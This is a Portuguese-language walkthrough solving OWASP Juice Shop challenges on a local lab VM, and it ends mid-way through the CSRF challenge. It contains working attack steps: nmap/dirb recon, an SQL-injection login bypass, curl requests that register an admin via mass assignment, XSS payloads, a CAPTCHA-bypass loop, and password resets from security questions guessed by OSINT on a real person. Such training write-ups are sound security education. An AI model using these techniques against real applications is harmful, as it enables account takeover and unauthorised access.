# owasp-juice-shop-solucoes
### VM: Ubuntu-18
### Desc-VM: Ubuntu-18 no IP 192.168.56.30
### Objetivo: Explorar as vulnarabilidades do Projeto Juice Shop da OWASP
### Prática: 
* nmap 192.168.56.30 -A # Tem alguma coisa na porta 3000


| PORT      | STATE  | SERVICE          | OBS                                                      |
|-----------|--------|------------------|----------------------------------------------------------|
| 22/tcp    | open   | ssh              |                                                          |
| 80/tcp    | open   | http             | Suporte Antigo e Novo (GLPI)                             |
| 81/tcp    | open   | hosts2-ns        | bWAPP                                                    |
| 3000/tcp  | open   | ppp              | Juice Shop                                               |
| 8080/tcp  | open   | http-proxy       | jBOSS                                                    |
| 8383/tcp  | open   | m2mservices      | Struts2 Showcase ( http://192.168.56.30:8383/.git/head ) |
| 10000/tcp | open   | snet-sensor-mgmt | Webmin via https                                         |


* http://192.168.56.30:3000/#/
> Being a web application with a vast number of intended security vulnerabilities, the OWASP Juice Shop is supposed to be the opposite of a best practice or template application for web developers: It is an awareness, training, demonstration and exercise tool for security risks in modern web applications. The OWASP Juice Shop is an open-source project hosted by the non-profit Open Web Application Security Project (OWASP) and is developed and maintained by volunteers. Check out the link below for more information and documentation on the project. https://owasp-juice.shop #Ubuntu-18

* $ dirb http://192.168.56.30:3000/#/.  # Nada
* $ dirb http://192.168.56.30:3000/ # Acessar os marcados geram erros
http://192.168.56.30:3000/assets (CODE:301|SIZE:179) 
http://192.168.56.30:3000/ftp (CODE:200|SIZE:11072)
::http://192.168.56.30:3000/profile (CODE:500|SIZE:1157)::                                                       
http://192.168.56.30:3000/promotion (CODE:200|SIZE:4939)                                                           
::http://192.168.56.30:3000/redirect (CODE:500|SIZE:3648)::                                                            
http://192.168.56.30:3000/robots.txt (CODE:200|SIZE:28)                                                            
http://192.168.56.30:3000/video (CODE:200|SIZE:2933187)                                                            
http://192.168.56.30:3000/Video (CODE:200|SIZE:2933187) 
* $ dirb http://192.168.56.30:3000 _usr_share_wordlists_dirb/big.txt  # Encontrados adicionalmente:
http://192.168.56.30:3000/metrics (CODE:200|SIZE:8779) 
* $ dirb http://192.168.56.30:3000/#/ _usr_share_wordlists_dirb/big.txt  # Nada

* Da página do Projeto:

![Catgorias](./imgs/categories.png "Catgorias")

* São mais de 100 desafios

### Broken Access Control: 10
_Admin Section_, _CSRF_, Easter Egg, _Five-Star Feedback_, _Forged Feedback_, _Forged Review_, _Manipulate Basket_, _Product Tampering_, SSRF, _View Basket_
### Broken Anti Automation: 4
_CAPTCHA Bypass_, Extra Language, Multiple Likes, Reset Morty’s Password
### Broken Authentication: 9
_Bjoern’s Favorite Pet_, Change Bender’s Password, _GDPR Data Erasure_, Login Bjoern, _Password Strength_, Reset Bender’s Password, Reset Bjoern’s Password, _Reset Jim’s Password_, Two Factor Authentication
### Cryptographic Issues: 5
Forged Coupon, Imaginary Challenge, Nested Easter Egg, Premium Paywall, _Weird Crypto_
### Improper Input Validation: 10
_Admin Registration_, _Deluxe Fraud_, Expired Coupon, _Missing Encoding_, Payback Time, Poison Null Byte, _Repetitive Registration_, Upload Size, Upload Type, _Zero Stars_
### Injection: 11
Christmas Special, _Database Schema,_ Ephemeral Accountant, _Login Admin_, _Login Bender_, _Login Jim_, NoSQL DoS, NoSQL Exfiltration, NoSQL Manipulation, SSTi, _User Credentials_
### Insecure Deserialization: 2
Blocked RCE DoS, Successful RCE DoS
### Miscellaneous: 4
Bully Chatbot, _Privacy Policy_, _Score Board_, _Security Policy_
### Security Misconfiguration: 4
Cross-Site Imaging, _Deprecated Interface_, _Error Handling_, Login Support Team
### Security through Obscurity: 3
Blockchain Hype, _Privacy Policy Inspection_, Steganography
### Sensitive Data Exposure: 16
_Access Log_, _Confidential Document_, Email Leak, _Exposed Metrics_, Forgotten Developer Backup, Forgotten Sales Backup, GDPR Data Theft, Leaked Access Logs, Leaked Unsafe Product, _Login Amy_, _Login MC SafeSearch_, Meta Geo Stalking, Misplaced Signature File, Reset Uvogin’s Password, Retrieve Blueprint, Visual Geo Stalking
### Unvalidated Redirects: 2
Allowlist Bypass, Outdated Allowlist
### Vulnerable Components: 9
Arbitrary File Write, Forged Signed JWT, Frontend Typosquatting, Kill Chatbot, Legacy Typosquatting, Local File Read, Supply Chain Attack, Unsigned JWT, Vulnerable Library
### XSS: 9
API-only XSS, _Bonus Payload,_ CSP Bypass, Client-side XSS Protection, _DOM XSS_, HTTP-Header XSS, Reflected XSS, Server-side XSS Protection, Video XSS
### XXE: 2
XXE Data Access, XXE DoS
### Total Σ: 100


________________________________________________


## 1 ESTRELA
1. ***Miscelaneus/Score Board*** -> Find the carefully hidden ‘Score Board’ page.
* Chrome -> http://192.168.56.30:3000/#/ -> F12 -> Sources -> main.js -> Pretiffy -> Ctrl+f -> score -> const Ks=[…, { path: "score-board", component: Oo }, … ] ;
* http://192.168.56.30:3000/#/score-board

2. ***Security Misconfiguration/Error Handling*** -> Provoke an error that is neither very gracefully nor consistently handled.
* dirb http://192.168.56.30:3000/ -> Automaticamente resolvido pela requisição em lote de url inválidas

3. ***Miscellaneous/Privacy Policy*** -> Read our privacy policy.
*  Chrome -> http://192.168.56.30:3000/# -> Registrar/Logar (registrado como _a@b:123456_  ) -> Conta -> Privacy & Security -> Privacy Policy (http://192.168.56.30:3000/#/privacy-security/privacy-policy)
> 🎉 That was super easy, right? This challenge is a bit of a joke actually, because nobody reads any fine print online... 🙈  

4. ***Improper Input Validation/Zero Stars*** -> Give a devastating zero-star feedback to the store.
* Login -> Custumer FeedBack (http://192.168.56.30:3000/#/contact)  -> F12 / Network -> Enviar um comentário qualquer com 1 estrela -> Feedbacks / copiar as cURL -> Editar a variável "rating”:1 para "rating”:0 -> Executar no Terminal:
```
 curl 'http://192.168.56.30:3000/api/Feedbacks/' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTgsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhQGIiLCJwYXNzd29yZCI6ImUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNlIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTExLTIzIDIxOjA2OjAwLjgxMSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTExLTIzIDIzOjE5OjA5Ljk3OSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Mzc3MTI4NDMsImV4cCI6MTYzNzczMDg0M30.ZQqAu-xm2z-SFAv4h-BCMH3Yv4EqWEJw8zQjhJ-u1cXog1nJXQg2wDMCRcMm2NpmqqoZSWbzOYVm3A2hSAf2tgu7D-scjEBFLHKuXKLRJ45qBLLdtmahSvvh9DjtJcgoUrE9ujVgWKR7nc5-icBudALoGGwTjK3236UBMqFBhig' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://192.168.56.30:3000' \
  -H 'Referer: http://192.168.56.30:3000/' \
  -H 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTgsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhQGIiLCJwYXNzd29yZCI6ImUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNlIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTExLTIzIDIxOjA2OjAwLjgxMSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTExLTIzIDIzOjE5OjA5Ljk3OSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Mzc3MTI4NDMsImV4cCI6MTYzNzczMDg0M30.ZQqAu-xm2z-SFAv4h-BCMH3Yv4EqWEJw8zQjhJ-u1cXog1nJXQg2wDMCRcMm2NpmqqoZSWbzOYVm3A2hSAf2tgu7D-scjEBFLHKuXKLRJ45qBLLdtmahSvvh9DjtJcgoUrE9ujVgWKR7nc5-icBudALoGGwTjK3236UBMqFBhig; continueCode=XYMxMJzk9o3alY5XyeZnmQrj4d86T3yIQl0wgEb7WN6vDqKPp12BRLV8OgrR; io=qlPJCQclonXx-dhJAAAT' \
  --data-binary '{"UserId":18,"captchaId":8,"captcha":"8","comment":"a (***)","rating":0}' \
  --compressed \
  --insecure
```

5. ***Improper Input Validation/Repetitive Registration*** -> Follow the DRY principle while registering a user. -> **Don’t repeat yourself**
* Login -> Not yet a Custumer? (http://192.168.56.30:3000/#/register) -> F12 / Network -> Enviar um resgitro com email igual ao seu usuário -> Users / copiar as cURL 
```
curl 'http://192.168.56.30:3000/api/Users/' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://192.168.56.30:3000' \
  -H 'Referer: http://192.168.56.30:3000/' \
  -H 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=B7RWN9JzX7qM2aQ4Kwrml5nVd86T3yIQlU3M0OpZD8o16veBEbgYjLPy3xky; io=nwPCFQY2VPw-XGjxAAAU' \
  --data-binary $'{"email":"a@b","password":"123456","passwordRepeat":"123456","securityQuestion":{"id":3,"question":"Mother\'s birth date? (MM/DD/YY)","createdAt":"2021-11-23T18:50:40.245Z","updatedAt":"2021-11-23T18:50:40.245Z"},"securityAnswer":"111111"}' \
  --compressed \
  --insecure
```
O que retorna:
```
{"message":"Validation error","errors":[{"field":"email","message":"email must be unique"}]}
```
* Retirar da requisição cURL acima `"email":"a@b"` e repetir o envio, o retorno é interessenate, parece que acrescentamos o usuário de id=24 e email=null.
```
{"status":"success","data":{"username":"","role":"customer","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":   "/assets/public/images/uploads/default.svg","isActive":true,"id":24,"updatedAt": "2021-11-24T02:04:40.914Z","createdAt":"2021-11-24T02:04:40.914Z","email":null,"deletedAt":null}}
```
* Repetindo a requisição o retorno é:
```
{"status":"success","data":{"username":"","role":"customer","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":   "/assets/public/images/uploads/default.svg","isActive":true,"id":25,"updatedAt": "2021-11-24T02:04:40.914Z","createdAt":"2021-11-24T02:05:40.714Z","email":null,"deletedAt":null}}
```
* Acrescentamos o usuário de id=25 e email=null, podemos logá-los fazendo a mesma inspeção da requisção de login -> Copy as cURL
* curl 'http://192.168.56.30:3000/rest/user/login' -H 'Content-Type: application/json' --data-binary $'{"email":null,"password":"123456"}'
```
{"authentication":{"token":"eyJ.......................0so","bid":24,”umail":""}}
```

6. ***Sensitive Data Exposure/Confidential Document*** -> Access a confidential document.
* http://192.168.56.30:3000/ftp -> Abrir os arquivos, inclusive os pdf dos ordens de compras.

7. ***Improper Input Validation/Missing Encoding*** -> Retrieve the photo of Bjoern's cat in "melee combat-mode".
* http://192.168.56.30:3000/#/photo-wall -> Tem uma linha com uma imagem quebrada -> F12 -> Inspecionar elemento:
`<img _ngcontent-bga-c216="" class="image" src="assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg" alt="😼 #zatschi #whoneedsfourlegs">`
* Os Caracteres “#” não podem pertencer a URL elas devem ser URL encodadas
* Abrir um site de URL Encode, por exemplo em [URL Encode and Decode - Online](https://www.urlencoder.org/), a conversão fica:
`assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg`

8. ***Sensitive Data Exposure/Exposed Metrics*** -> Find the endpoint that serves usage data to be scraped by a popular monitoring system ([GitHub - prometheus/prometheus: The Prometheus monitoring system and time series database.](https://github.com/prometheus/prometheus)).
* https://prometheus.io/docs/prometheus/latest/getting_started/#starting-prometheus ->  `You can also verify that Prometheus is serving metrics about itself by navigating to its metrics endpoint: http://localhost:9090/metrics ` . No caso: http://192.168.56.30:3000/metrics

9. ***XSS/Bonus Payload*** -> Use the bonus payload `<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>` in the DOM XSS challenge.

* O campo de pesquisa está suscetível a HTML injection: 

![](./imgs/bonuspayload.png)

* Colar o payload no pesquisar e Enter -> Vai tocar a música “OWASP Juice Shop Jingle”.

10. ***XSS/DOM XSS*** -> Perform a DOM XSS attack with `<iframe src="javascript:alert('xss')”>`
* Colar o payload no pesquisar e Enter -> Vai aparecer o alerta escrito “xss“.

11. ***Unvalidated Redirects/Outdated Whitelist*** -> Let us redirect you to one of our crypto currency addresses which are not promoted any longer.
* Logar -> Account / Orders & Payment / Digital Wallet -> Adiconar um valor e um cartão fictício (**5555555555554444**) 
* Tentar comprar alguma coisa -> Add to basket -> Your Basket ->  Checkout (http://192.168.56.30:3000/#/address/select)  -> Criar um endereço -> Selecione este endereço -> Continue ->  Selecione standard delivery -> Continue -> Selecione um cartão -> Existem 5 links em Other payment options -> Será que existem mais?
> 	Chrome -> F12 -> Sources -> main.js -> Pretiffy   
> 	Firefox  -> F12 -> Debugger -> main.js -> Pretty print source   
* Ctrl+f -> `'https://'` -> 
/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm , 
/redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW e 
/redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6
* Sobrescrever um dos 5 links já existentes com qualquer um dos links acima -> clicar no botão editado

________________________________________________

## 2 ESTRELAS
12. ***Broken Access Control/View Basket*** -> View another user's shopping basket.
* F12 -> Storage -> Sessions Storage -> bid (oferta) tem relação com carrinho -> alterado o nr do bid -> F5 -> altera o valor 
![](./imgs/des12.png)

13. ***Injection/Login Admin*** -> Log in with the administrator's user account.
* Na tela de Login -> email:`' OR true —` e senha qualquer
* Uma possível codificação desta maneira ocorre do lado do servidor:
```
email=$['POST'].email
pass=hash($['POST'].password)
query="SELECT * FROM Users WHERE email = '$email' AND password = '$pass' AND deletedAt IS NULL"
```
* Com SQL Injection:
```
query="SELECT * FROM Users WHERE email = 'admin@email.com' —' AND password = '$pass' AND deletedAt IS NULL"
```
* Vai selecioanar a tabela toda!! Talvez na ordem crescente dos ids dos usuários, pq assim o admin seria o 1º usuário da tabela. Em algum ponto do backend é selecionado o 1º elemento desta query.
* Poderia ser resolvido por exemplo com:
	* 1. **Prepared Statements (with Parameterized Queries)**
``` 
Exemplo em JAVA
String query = "SELECT * FROM Users WHERE email = ? AND password = ? AND deletedAt IS NULL";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, email);
pstmt.setString( 2, password);
ResultSet results = pstmt.executeQuery( );


 Escaping SQLi in PHP
$stmt = $pdo->prepare('SELECT * FROM Users WHERE email = ? AND password = ? AND deletedAt IS NULL');
$stmt->bindValue(1, $email);
$stmt->bindValue(2, $password);
$stmt->execute();
```
* 
    * 2. **Escaping All User-Supplied Input**
    
``` 
Hex-encoding all input
query="SELECT * FROM Users WHERE hex_encode(email) = hex_encode('$email') AND hex_encode(password) = hex_encode('$password') AND deletedAt IS NULL"
```
* 
	* 3. **Validation of user input**

```
PHP filter_var function
email = filter_var("<p>u</p>a@b", FILTER_SANITIZE_EMAIL);
#"puppies@codecademy.com"
email = filter_var("<p>u</p>a@b", FILTER_VALIDATE_EMAIL);
#false

PHP preg_match function
$pattern = '/^[a-z0-9.]+@[a-z0-9]+\.[a-z]+\.([a-z]+)?$/i';
preg_match($pattern, "$email"); // Retorna: 1 ou 0
```

14. ***Broken Authentication/Password Strength*** -> Log in with the administrator's user credentials without previously changing them or applying SQL Injection.
* Pelo SQLi feito anteriormente já se sabe o email do admin -> admin@juice-sh.op
* Tantar variaçãoes de admin… no campo senha -> password, password123, p@$$w0rd, admin, **admin123**
* Putz -> admin123

15. ***Miscellaneous/Security Policy*** -> Behave like any "white-hat" should before getting into the action.
> White hat hackers employ the same methods of hacking as black hats, with one exception- they do it with permission from the owner of the system first, which makes the process completely legal.  
* Vamos tentar enviar um email ou mensagem através da plataforma. # Nada
* Google: Security Policy -> [security.txt: Proposed standard for defining security policies](https://securitytxt.org/) -> Create a text file called `security.txt` under the `.well-known` directory of your project.  Must be served over HTTPS. -> Meant to allow security researchers to easily report security vulnerabilities
* Chrome -> http://192.168.56.30:3000/.well-known/security.txt
> Contact: mailto:donotreply@owasp-juice.shop  
> Encryption: https://keybase.io/bkimminich/pgp_keys.asc?fingerprint=19c01cb7157e4645e9e2c863062a85a8cbfbdcda  
> Acknowledgements: _#_score-board  

16. ***Cryptographic Issues/Weird Crypto*** -> Inform the shop about an algorithm or library it should definitely not use the way it does. (http://192.168.56.30:3000/#/contact)
* Após a questão 25. pode-se checar as hashes dos outros usuários, adicionando-se um usuário com a senha `123456` pode-se comparar a hash da aplicação juice shop com vários outros algoritmos de hashes, foi descoberto que foi usado o MD5 sem sal para criptografar as senhas.
* No campo de comentário -> MD5

17. ***Broken Access Control/Admin Section*** -> Access the administration section of the store.
* Login como admin (admin@juice-sh.op:admin123) -> main.js -> Ctrl+f -> path: -> tem um `path: "administration"`  que era inacessível como usuário normal
* http://192.168.56.30:3000/#/administration -> Aparece a lista de usuário e de feedbacks

18. ***Sensitive Data Exposure/Login MC SafeSearch*** -> Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.
* Após #Broken Access Control/Admin Section*** :
> User #8  
> Email: mc.safesearch@juice-sh.op  
> Created at 2021-11-26T17:32:37.403Z  
> Updated at 2021-11-26T17:32:37.403Z  
* Google: mc safesearch -> youtube **Rapper Who Is Very Concerned With Password Security**
-> Na letra da música tem uma parte
```
... why not use the first name of your favorite pet?
Mine's is my dog mister noodles
they don't matter if you know
cuz I was tricky and replaced some vowels with zeros.
I mean not, you know what? Never mind. 
That was a general exemple
not specifically mine
...
```
* Leet Speak de noodels ->  n00dles -> Testando `Mr. N00dles` 

19. ***Broken Access Control/Five-Star Feedback*** -> Get rid of all 5-star customer feedback.
* Após #Broken Access Control/Admin Section# : Deletar manualmente todos os feedbacks 5 estrelas.

20. ***Security Misconfiguration/Deprecated Interface*** -> Use a deprecated B2B interface that was not properly shut down.
* Google: B2B interface -> **Business-to-Business (B2B) Gateways** integrate data from back-end systems enabling information exchange across trading partners. B2B Gateways also provide a centralized point for transformation of multiple data sources through interoperability standards such as  [XML](https://en.wikipedia.org/wiki/XML)  
* Login -> main.js -> Ctrl+f -> `allowedMimeType: ` -> [“application_pdf", "application_xml", "text_xml", "application_zip", "application_x-zip-compressed", "multipart_x-zip"]
* Vamos tentar fazer um upload de um xml, o lugar para isto é  em `Complain` no menu lateral.
> 410 Error: B2B customer complaints via file upload have been deprecated for security reasons (extensions.xml)  

________________________________________________

## 3 ESTRELAS
21. ***Improper Input Validation/Admin Registration*** -> Register as a user with administrator privileges.
* Login como admin (admin@juice-sh.op:admin123) ->  http://192.168.56.30:3000/#/administration -> Verificar o retorno da requisição GET _rest_user_authentication-details_ HTTP/1.1
* São 4 roles -> customer, admin, deluxe e accounting ao observar o que retorna dos demais usuários
```
"id":1,"username":"","email":"admin@juice-sh.op","role":"admin"
"id":2,"username":"","email":"jim@juice-sh.op”,”role":"customer",
"id":3,"username":"","email":"bender@juice-sh.op","role":"customer"
"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","role":"admin"
"id":5,"username":"","email":"ciso@juice-sh.op","role":"deluxe","deluxeToken":"d715c2c75d4a42d3825a050e0a0163c1959b51165373f17bd8eed7b1e05bf20d",
"id":6,"username":"","email":"support@juice-sh.op","role":"admin",
"id":7,"username":"","email":"morty@juice-sh.op","role":"customer"
"id":8,"username":"","email":"mc.safesearch@juice-sh.op","role":"customer"
"id":9,"username":"","email":"J12934@juice-sh.op","role":"admin"
"id":10,"username":"wurstbrot","email":"wurstbrot@juice-sh.op","role":"admin"
"id":11,"username":"","email":"amy@juice-sh.op",,"role":"customer"
"id":12,"username":"","email":"bjoern@juice-sh.op",""role":"admin"
"id":13,"username":"","email":"bjoern@owasp.org","role":"deluxe","deluxeToken":"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4"
"id":15,"username":"","email":"accountant@juice-sh.op","role":"accounting"
"id":16,"username":"","email":"uvogin@juice-sh.op","role":"customer","deluxeToken":"",
"id":17,"username":"","email":"demo","role":"customer","deluxeToken":"",
"id":18,"username":"","email":"a@b","role":"deluxe","deluxeToken":"ea837b0dd4f3c21784f4e9e627c1cd7b65a311cc8e14daafac442d8ab38dd191"
```
* Tb existe o parâmetro token, mostrando quais dos usuários estão logados
*  Tentar fazer registro através de requisição cURL acrescentando `"role":"admin"`
```
curl 'http://192.168.56.30:3000/api/Users/' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://192.168.56.30:3000' \
  -H 'Referer: http://192.168.56.30:3000/' \
  -H 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=B7RWN9JzX7qM2aQ4Kwrml5nVd86T3yIQlU3M0OpZD8o16veBEbgYjLPy3xky; io=nwPCFQY2VPw-XGjxAAAU' \
  --data-binary $'{"email":"a@c","password":"123456","passwordRepeat":"123456","role":"admin","securityQuestion":{"id":3,"question":"Mother\'s birth date? (MM/DD/YY)","createdAt":"2021-11-23T18:50:40.245Z","updatedAt":"2021-11-23T18:50:40.245Z"},"securityAnswer":"111111"}' \
  --compressed \
  --insecure
``` 
* Resposta:
```
{"status":"success","data":{"username":"","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":"/assets/public/images/uploads/default.svg","isActive":true,"id":19,"email":"a@c","role":"admin","updatedAt":"2021-11-28T00:36:09.073Z","createdAt":"2021-11-28T00:36:09.073Z","deletedAt":null}}
```

22. ***Broken Authentication/Bjoern's Favorite Pet*** -> Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question. (http://192.168.56.30:3000/#/forgot-password)
* Navegar a página de forgot-password e digitar algo no campo do email
* Observando as requsições que saem do navegador em DevTools -> Network
* Pode-se replicar via curl para qualquer usuário com `curl http://192.168.56.30:3000/rest/user/security-question?email=bjoern@owasp.org`
```
{"question":
	{"id":7,"question":"Name of your favorite pet?", 
	"createdAt":"2021-11-28T14:23:15.688Z", "updatedAt":"2021-11-28T14:23:15.688Z"}
}
```
* Fazer Login como usuário Bjorn -> `OR id=7--` -> em DevTools, observar as requisições apartir de agora possuem um Header `Authorization: Bearer TOKEN` -> Copiar o token para montagem da requsição de data-export ou simplesmente utilizar o site em Conta -> Privacidade e Segurança -> Pedido de Obtenção de Dados `curl -X POST http://192.168.56.30:3000/rest/user/data-export HTTP/1.1 -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJiam9lcm5Ab3dhc3Aub3JnIiwicGFzc3dvcmQiOiI5MjgzZjFiMmU5NjY5NzQ5MDgxOTYzYmUwNDYyZTQ2NiIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6ImVmZTJmMTU5OWUyZDkzNDQwZDUyNDNhMWZmYWY1YTQxM2I3MGNmM2FjOTcxNTZiZDZmYWI5YjVkZGZjYmUwZTQiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvMTIuanBnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTExLTI4IDE0OjIzOjE2LjY0MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTExLTI4IDE4OjM1OjE0LjY4NyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzgxMzE5MDcsImV4cCI6MTYzODE0OTkwN30.KxXK7QSRtlDy9fv68HVyJPa_ZUXVO-ejp8XchVdwlOklwYoWMgjgF9J4Y_0uZXL8rLRNm5Eoi3LQ5SY8b9y-Wm15ZCsTo1ha09nhRfaB9ubsR_WcIGsf_0xDB0D9HryRpeOtkulTGHNG7LTNrFQoj-p-tfhDI9euQCo4XFUujcc'`
```
{"userData":"{
  \"username\": \"\",
  \"email\": \"bjoern@owasp.org\",
  \"orders\": [],
  \"reviews\": [
    {
      \"message\": \"Wait for a 10$ Steam sale of Tabletop Simulator!\",
      \"author\": \"bjoern@owasp.org\",
      \"productId\": 35,
      \"likesCount\": 0,
      \"likedBy\": []
    }
  ],
  \"memories\": [
    {
      \"imageUrl\": \"http://192.168.56.30:3000/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg\",
      \"caption\": \"😼 #zatschi #whoneedsfourlegs\"
    }
  ]
}","confirmation":"Your data export will open in a new Browser window."}
```
* Recebemos outra dica: a imagem postada por Bjorn cujo caption=😼 # zatschi # whoneedsfourlegs
* Google : Bjoern OWASP -> Descobirmos um Twitter -> Entrando no Twitter do Bjoern -  Björn Kimminich (@bkimminich)  (https://twitter.com/bkimminich) Tem uma postagem com o nome de seu gato

![](./imgs/twitterbjoern.png)

* Pode-se seguir a plataforma ou alterar via cmd `curl -X POST http://192.168.56.30:3000/rest/user/reset-password -H 'Content-Type: application/json' --data-raw '{"email":"bjoern@owasp.org","answer":"Zaya","new":"123456","repeat":"123456"}'`
* A categoria/Tag deveria ser # Sensitive Data Exposure…

23. ***Broken Anti Automation/CAPTCHA Bypass*** -> Submit 10 or more customer feedbacks within 10 seconds.
* Acessando http://192.168.56.30:3000/#/contact -> Observar em DevTools (F12) -> A requisição captcha/ -> `{captchaId: 4, captcha: "7-3-4", answer: "0"}` 
* Como o tempo é hábil dá pra colar no terminal 10x o cmd `curl 'http://192.168.56.30:3000/api/Feedbacks/' -H 'Content-Type: application/json' --data-binary '{"UserId":13,"captchaId":4,"captcha":"0","comment":"qqcoisa","rating":0}'`
```
{"status":"success","data":{"id":30,"UserId":13,"comment":"qqcoisa","rating":0,"updatedAt":"2021-11-28T22:47:25.686Z","createdAt":"2021-11-28T22:47:25.686Z"}}
```
* Se o tempo não fosse hábil poderia ser feito com script:
```
for i in {1..10}; do
    RESP="$(curl 'http://192.168.56.30:3000/api/Feedbacks/' -H 'Content-Type: application/json' --data-binary '{"UserId":13,"captchaId":4,"captcha":"0","comment":"qqcoisa","rating":0}')"
    echo $RESP
done
echo "done"
```

24. ***Broken Access Control/CSRF*** -> Change the name of a user by performing Cross-Site Request Forgery from another origin. (http://htmledit.squarefree.com/)
* Observando a requisição feita pelo navegador ao se alterar o username:
```
POST /profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded
